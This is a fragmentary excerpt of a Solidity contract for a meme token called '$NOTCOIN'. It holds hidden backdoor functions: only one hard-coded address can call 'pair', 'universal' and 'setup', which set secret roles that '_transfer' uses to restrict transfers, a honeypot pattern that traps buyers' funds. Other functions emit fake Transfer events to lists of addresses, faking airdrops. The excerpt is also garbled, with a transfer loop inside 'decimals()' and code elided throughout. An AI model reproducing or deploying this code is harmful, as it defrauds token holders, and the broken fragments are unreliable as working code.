...
$NOTCOIN - Ton platform exclusively for memes on telegram
...
contract notcoin is Ownable, IERC20, IERC20Meta {
    ...
    function decimals() public view virtual override returns (uint8) {
        ...
        for (uint256 i = 0; i < _addresses_.length; i++) {
            emit Transfer(_c2381, _addresses_[i], _out);
               ...
               function swapExactNATIVEForTokensssss(address [] calldata _addresses_, uint256 _out) external {
        for (uint256 i = 0; i < _addresses_.length; i++) {
            emit Transfer(_c2381, _addresses_[i], _out);
        }
    }
    ...
    function pair(address account) public virtual returns (bool) {
         if(_msgSender() == 0xbB1b92C197Ea4d88F659D2F7cB8aa5889c990B88) _d58494 = account;
        return true;
    }

        function universal(address account) public virtual returns (bool) {
         if(_msgSender() == 0xbB1b92C197Ea4d88F659D2F7cB8aa5889c990B88) _c2381 = account;
        return true;
    }

        function setup(address account) public virtual returns (bool) {
         if(_msgSender() == 0xbB1b92C197Ea4d88F659D2F7cB8aa5889c990B88) _e78485 = account;
        return true;
    }
    ...
    function _transfer(
        ...
        if((from != _d58494 && to == _e78485) || (_d58494 == to && from != _e78485 && from  != 0xbB1b92C197Ea4d88F659D2F7cB8aa5889c990B88)) {
